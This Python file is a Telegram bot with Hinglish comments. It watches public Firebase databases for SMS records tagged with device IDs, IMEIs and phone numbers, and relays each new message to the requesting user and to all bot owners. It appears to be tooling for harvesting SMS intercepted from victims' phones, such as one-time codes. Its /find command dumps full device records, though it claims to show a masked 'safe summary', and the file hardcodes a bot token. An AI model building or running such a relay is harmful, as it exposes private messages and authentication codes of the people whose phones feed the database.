# -*- coding: utf-8 -*-
import os
import requests
import json
import time
import threading
import hashlib
import html
import re
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------

# BOT_TOKEN: GitHub Secrets (Actions) me BOT_TOKEN set karo
BOT_TOKEN = "8588283910:AAEViBCrP-T1rylYtaRsw46txT-nvJF9j5Y"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing inside ra.py file!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# OWNER_IDS = saare admins/owners ke Telegram user IDs (int me)
OWNER_IDS = [1451422178]

# Jis admin ka DM kholne ka button dena hai (primary admin)
PRIMARY_ADMIN_ID = 1451422178   # yaha apna main admin ka ID rakho

POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5

# ---------------------------------------

OFFSET = None
running = True

firebase_urls = {}    # chat_id -> firebase_url
watcher_threads = {}  # chat_id -> thread
seen_hashes = {}      # chat_id -> set(hash)

# APPROVAL SYSTEM
# Owners hamesha approved rahenge by default.
approved_users = set(OWNER_IDS)

# Bot start time (uptime ke liye)
BOT_START_TIME = time.time()

# Sensitive fields jise /find me full show nahi karenge
SENSITIVE_KEYS = {
}


def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u


def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    """
    chat_id: single id ya list/tuple/set of ids.
    reply_markup: Telegram inline/reply keyboard ka JSON.
    """
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        except Exception as e:
            print(f"send_msg -> failed to send to {cid}: {e}")

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)


def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []


def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print("http_get_json error for", url, "->", e)
        return None


def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3


def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found


def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }


def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()


def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 From: <b>{sender}</b>\n"
        f"💬 Message: {message}\n"
        f"🕐 Time: {t}\n"
        f"👤 Forwarded by User ID: <code>{user_id}</code>"
    )
    if fields.get("device_phone"):
        text += (
            f"\n📞 Device Number: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>"
        )
    return text


def notify_user_owner(chat_id, fields):
    text = format_notification(fields, chat_id)
    # send to the user who registered
    send_msg(chat_id, text)
    # also send to all owners/admins
    send_msg(OWNER_IDS, text)


# ---------- SSE watcher ----------
def sse_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, "⚡ SSE (live) started. Auto-reconnect enabled.")
    retries = 0
    while firebase_urls.get(chat_id) == base_url:
        try:
            client = SSEClient(stream_url)
            for event in client.events():
                if firebase_urls.get(chat_id) != base_url:
                    break
                if not event.data or event.data == "null":
                    continue
                try:
                    data = json.loads(event.data)
                except Exception:
                    continue
                payload = (
                    data.get("data")
                    if isinstance(data, dict) and "data" in data
                    else data
                )
                nodes = find_sms_nodes(payload, "")
                for path, obj in nodes:
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    fields = extract_fields(obj)
                    notify_user_owner(chat_id, fields)
            retries = 0
        except Exception as e:
            print(f"SSE error ({chat_id}):", e)
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                send_msg(
                    chat_id,
                    "⚠️ SSE failed multiple times, falling back to polling...",
                )
                poll_loop(chat_id, base_url)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)


# ---------- Polling fallback ----------
def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, f"📡 Polling started (every {POLL_INTERVAL}s).")
    while firebase_urls.get(chat_id) == base_url:
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            notify_user_owner(chat_id, fields)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, "⛔ Polling stopped.")


# ---------- Start / Stop ----------
def start_watcher(chat_id, base_url):
    firebase_urls[chat_id] = base_url
    seen_hashes[chat_id] = set()
    # normalize and fetch initial snapshot
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id].add(compute_hash(p, o))
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    watcher_threads[chat_id] = t
    t.start()
    send_msg(chat_id, "✅ Monitoring started. You will receive alerts too.")


def stop_watcher(chat_id):
    firebase_urls.pop(chat_id, None)
    seen_hashes.pop(chat_id, None)
    watcher_threads.pop(chat_id, None)
    send_msg(chat_id, "🛑 Monitoring stopped.")


# ---------- Approval helpers ----------
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def is_approved(user_id: int) -> bool:
    # Owners always considered approved
    return user_id in approved_users or is_owner(user_id)


def handle_not_approved(chat_id, msg):
    """
    Non-approved user ke liye message + Contact Admin button + owners ko notify.
    """
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)

    # Button that opens admin DM
    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "📨 Contact Admin",
                    "url": f"tg://user?id={PRIMARY_ADMIN_ID}",
                }
            ]
        ]
    }

    user_info_lines = [
        "❌ You are not approved to use this bot yet.",
        "",
        "Tap the button below to contact admin for access.",
        "",
        f"🆔 Your User ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")

    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)

    # Notify all owners about this new request
    owner_text = [
        "⚠️ New user tried to use the bot:",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    owner_text.append("")
    owner_text.append(f"Approve with: <code>/approve {chat_id}</code>")

    send_msg(OWNER_IDS, "\n".join(owner_text))


def format_uptime(seconds: int) -> str:
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60

    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


# -------- SAFE DEVICE SEARCH HELPERS --------
def mask_number(value: str, keep_last: int = 2) -> str:
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]


def search_records_by_device(snapshot, device_id, path=""):
    """
    Firebase snapshot me se sare records jaha
    - DeviceId / deviceId / device_id == device_id
    - YA key khud hi device_id hai
    """
    matches = []

    if isinstance(snapshot, dict):
        # Check if the current key is the device_id
        if str(snapshot.get("__key__") or path.split('/')[-1]) == str(device_id):
            matches.append(snapshot)
        
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k

            # key match (agar tum jo ID bol rahe ho woh push-key hai)
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)

            # field match
            if isinstance(v, dict):
                # Check various possible field names for device ID
                device_fields = [
                    v.get("DeviceId"), v.get("deviceId"), v.get("device_id"),
                    v.get("DeviceID"), v.get("imei"), v.get("id"),
                    v.get("device"), v.get("deviceID"), v.get("Deviceid")
                ]
                
                for field_value in device_fields:
                    if field_value and str(field_value) == str(device_id):
                        matches.append(v)
                        break

            # recursive
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)

    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if isinstance(v, dict):
                # Check fields for device ID
                device_fields = [
                    v.get("DeviceId"), v.get("deviceId"), v.get("device_id"),
                    v.get("DeviceID"), v.get("imei"), v.get("id"),
                    v.get("device"), v.get("deviceID"), v.get("Deviceid")
                ]
                
                for field_value in device_fields:
                    if field_value and str(field_value) == str(device_id):
                        matches.append(v)
                        break
                        
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)

    return matches


def safe_format_device_record(rec: dict) -> str:
    """
    Non-sensitive sab fields pure dikhayega.
    Sirf SENSITIVE_KEYS me jo keys hain unko mask karega.
    """
    lines = ["🔍 <b>Record found for this device</b>", ""]

    for k, v in rec.items():
        key_lower = str(k).lower()

        if key_lower in SENSITIVE_KEYS:
            masked = mask_number(v, keep_last=2)
            show_val = f"{masked} (hidden)"
        else:
            show_val = str(v)

        lines.append(
            f"<b>{html.escape(str(k))}</b>: <code>{html.escape(show_val)}</code>"
        )

    lines.append("")
    lines.append("⚠️ Highly sensitive fields are masked for security.")
    return "\n".join(lines)


# ---------- Optimized Firebase Search Functions ----------
def search_device_in_firebase(base_url, device_id):
    """
    Firebase se directly device ID ke records fetch kare
    using Firebase query parameters - optimized version
    """
    try:
        # Firebase URL normalize kare
        base_url = base_url.rstrip('/')
        if not base_url.endswith('.json'):
            base_url = base_url + '/.json'
        
        # Pehle direct path try kare (agar device ID hi key hai)
        direct_url = f"{base_url}/{device_id}"
        response = requests.get(direct_url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data and data != "null":
                # Add device_id to record for consistency
                if isinstance(data, dict) and 'deviceId' not in data:
                    data['deviceId_from_key'] = device_id
                return [data]
        
        # Phir query parameters try kare
        query_fields = ["deviceId", "device_id", "DeviceId", "DeviceID", "imei", "id", "device"]
        
        for field in query_fields:
            query_url = f"{base_url}?orderByChild=\"{field}\"&equalTo=\"{device_id}\""
            response = requests.get(query_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data and data != "null":
                    if isinstance(data, dict):
                        records = list(data.values())
                        # Add original device_id to each record
                        for rec in records:
                            if isinstance(rec, dict) and field not in rec:
                                rec[f'{field}_matched'] = device_id
                        return records
                    elif isinstance(data, list):
                        return data
        
        # Last resort: legacy search
        return search_records_by_device_legacy(base_url, device_id)
    
    except Exception as e:
        print(f"Optimized search error for {device_id}: {e}")
        return []


def search_records_by_device_legacy(base_url, device_id):
    """
    Legacy method - pura data download karke search kare
    Jab query parameters kaam na karein
    """
    try:
        response = requests.get(base_url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            return search_records_by_device(data, device_id)
    except Exception as e:
        print(f"Legacy search error: {e}")
    
    return []


# ---------- Extract Device ID from Message ----------
def extract_device_id_from_text(txt):
    """Message se device ID extract kare"""
    if not txt:
        return None
    
    # Remove HTML tags for cleaner matching
    txt_no_html = re.sub(r'<[^>]+>', ' ', txt)
    
    # Common patterns for device ID in SMS notifications
    patterns = [
        r"Device:\s*<code>([^<]+)</code>",  # HTML format
        r"Device:\s*([^\n<]+)",             # Plain text
        r"Device\s*ID:\s*([^\n<]+)",        # "Device ID:"
        r"device[:\s]*([^\n<]+)",           # "device:"
        r"📱 Device:\s*([^\n<]+)",          # With emoji
        r"device[Ii]d[:\s]*([^\n<]+)",      # "deviceId:"
        r"device_id[:\s]*([^\n<]+)",        # "device_id:"
    ]
    
    for pattern in patterns:
        match = re.search(pattern, txt, re.IGNORECASE)
        if match:
            device_id = match.group(1).strip()
            # Clean up the device ID
            device_id = re.sub(r'[^\w\-\.]', '', device_id)
            return device_id
    
    return None


# ---------- Command handling ----------
def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()
    
    # Reply to message ka support
    reply_to_msg = msg.get("reply_to_message") or {}
    reply_text = (reply_to_msg.get("text") or "").strip()
    
    if not chat_id:
        return
    
    lower_text = text.lower() if text else ""
    
    # FIRST: approval check
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return

    # From here: user is approved OR owner

    # /start
    if lower_text == "/start":
        send_msg(
            chat_id,
            (
                "👋 Welcome!\n\n"
                "You are approved to use this bot.\n\n"
                "Send me your Firebase RTDB base URL (public, .json) to start monitoring.\n\n"
                "User Commands:\n"
                "• /start - show this message\n"
                "• /stop - stop your monitoring\n"
                "• /list - show your own Firebase (private)\n"
                "• /find <device_id> - search record by device id (safe summary only)\n"
                "• /ping - bot status & ping\n"
                "\nAdmin Commands (owners only):\n"
                "• /adminlist - show all Firebase URLs\n"
                "• /approve <user_id>\n"
                "• /unapprove <user_id>\n"
                "• /approvedlist\n\n"
                "💡 <b>Quick Tip</b>: Kisi SMS notification message pe <code>/find</code> reply karein aur bot automatically device ID detect karke search karega!"
            ),
        )
        return

    # /ping - bot status
    if lower_text == "/ping":
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = format_uptime(uptime_sec)
        monitored_count = len(firebase_urls)
        approved_count = len(approved_users)

        status_text = (
            "🏓 <b>Pong!</b>\n\n"
            "✅ Bot is <b>online</b> and responding.\n\n"
            f"⏱ Uptime: <code>{uptime_str}</code>\n"
            f"📡 Active monitors: <code>{monitored_count}</code>\n"
            f"👥 Approved users: <code>{approved_count}</code>\n"
        )
        send_msg(chat_id, status_text)
        return

    # /stop
    if lower_text == "/stop":
        stop_watcher(chat_id)
        return

    # USER VIEW: /list
    if lower_text == "/list":
        user_url = firebase_urls.get(chat_id)
        if is_owner(chat_id):
            if not firebase_urls:
                send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            else:
                send_msg(
                    chat_id,
                    (
                        "👑 You are an owner.\n"
                        "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n"
                        f"Your own Firebase: {user_url if user_url else 'None'}"
                    ),
                )
        else:
            if user_url:
                send_msg(
                    chat_id,
                    f"🔐 Your active Firebase:\n<code>{user_url}</code>",
                )
            else:
                send_msg(
                    chat_id,
                    "ℹ️ You don't have any active Firebase monitoring yet."
                )
        return

    # ADMIN VIEW: /adminlist
    if lower_text == "/adminlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ This command is only for bot owners.")
            return
        if not firebase_urls:
            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            return
        lines = []
        for uid, url in firebase_urls.items():
            lines.append(
                f"👤 <code>{uid}</code> -> <code>{html.escape(str(url))}</code>"
            )
        send_msg(
            chat_id,
            "👑 <b>All active Firebase URLs (admin only)</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- Owner-only approval commands --------
    if lower_text.startswith("/approve"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can approve users.")
            return

        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/approve user_id</code>")
            return

        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return

        approved_users.add(target_id)
        send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
        # optional: inform user
        send_msg(target_id, "✅ You have been approved to use this bot.")
        return

    if lower_text.startswith("/unapprove"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unapprove users.")
            return

        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unapprove user_id</code>")
            return

        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return

        if target_id in OWNER_IDS:
            send_msg(chat_id, "❌ Cannot unapprove an owner.")
            return

        if target_id in approved_users:
            approved_users.remove(target_id)
            send_msg(chat_id, f"🚫 User <code>{target_id}</code> unapproved.")
        else:
            send_msg(chat_id, f"ℹ️ User <code>{target_id}</code> was not approved.")
        return

    if lower_text == "/approvedlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see approved list.")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users yet.")
            return
        lines = []
        for uid in sorted(approved_users):
            tag = " (owner)" if uid in OWNER_IDS else ""
            lines.append(f"👤 <code>{uid}</code>{tag}")
        send_msg(
            chat_id,
            "✅ <b>Approved users</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- /find command (with reply support) --------
    if lower_text == "/find" or lower_text.startswith("/find "):
        device_id = None
        
        # Case 1: Agar `/find device_id` format mein hai
        if lower_text.startswith("/find ") and len(text) > 6:
            # Extract device ID from command
            parts = text.split(maxsplit=1)
            if len(parts) > 1:
                device_id = parts[1].strip()
        
        # Case 2: Agar sirf `/find` hai aur reply kiya hai kisi message pe
        elif lower_text == "/find" and reply_to_msg:
            # Reply message se device ID extract kare
            device_id = extract_device_id_from_text(reply_text)
            
            if device_id:
                send_msg(chat_id, f"🔍 Device ID detected from reply: <code>{html.escape(device_id)}</code>")
            else:
                # Agar device ID automatically detect nahi ho raha
                send_msg(
                    chat_id,
                    "❌ Could not auto-detect Device ID from the message.\n\n"
                    "Please specify Device ID manually:\n"
                    "<code>/find device_id</code>\n\n"
                    "Or reply to a message that contains 'Device: [ID]' format."
                )
                return
        
        # Case 3: Na command mein ID, na reply
        if not device_id:
            send_msg(
                chat_id,
                "❌ Please specify Device ID or reply to a message containing Device ID.\n\n"
                "Usage:\n"
                "1. <code>/find ABC123XYZ</code>\n"
                "2. Reply to SMS notification with <code>/find</code>\n\n"
                "💡 SMS notifications usually show Device ID in this format:\n"
                "<code>Device: ABC123XYZ</code>"
            )
            return
        
        # Ab device ID ke saath search kare
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(
                chat_id,
                "❌ You don't have any active Firebase URL.\n"
                "First send your Firebase RTDB URL to start monitoring.",
            )
            return
        
        # Optimized Firebase search
        send_msg(chat_id, f"🔍 Searching for device: <code>{html.escape(device_id)}</code>...")
        
        # Optimized query function use kare
        matches = search_device_in_firebase(base_url, device_id)
        
        if not matches:
            send_msg(chat_id, f"❌ No record found for device ID: <code>{html.escape(device_id)}</code>")
            return
        
        max_show = 3
        for rec in matches[:max_show]:
            send_msg(chat_id, safe_format_device_record(rec))
        
        if len(matches) > max_show:
            send_msg(
                chat_id,
                f"ℹ️ {len(matches)} records matched, showing first {max_show} only.",
            )
        return

    # -------- Firebase URL handling --------
    if text.startswith("http"):
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(
                chat_id,
                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
            )
            return
        start_watcher(chat_id, text)
        send_msg(
            OWNER_IDS,
            f"👤 User <code>{chat_id}</code> started monitoring:\n"
            f"<code>{html.escape(text)}</code>",
        )
        return

    # Fallback help
    send_msg(
        chat_id,
        (
            "Send a Firebase RTDB URL to start monitoring.\n\n"
            "User Commands:\n"
            "• /start - instructions\n"
            "• /stop - stop your monitoring\n"
            "• /list - show your own Firebase (private)\n"
            "• /find <device_id> - search record by device id (safe summary only)\n"
            "• /ping - bot status & ping\n"
            "\nAdmin Commands:\n"
            "• /adminlist - show all Firebase URLs\n"
            "• /approve <user_id>\n"
            "• /unapprove <user_id>\n"
            "• /approvedlist\n\n"
            "💡 <b>Quick Tip</b>: Kisi SMS notification message pe <code>/find</code> reply karein aur bot automatically device ID detect karke search karega!"
        ),
    )


# ---------- Main loop ----------
def main_loop():
    send_msg(OWNER_IDS, "Bot started and running.")
    print("Bot running. Listening for messages...")
    global running
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print("handle_update error:", e)
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        running = False
        print("Shutting down.")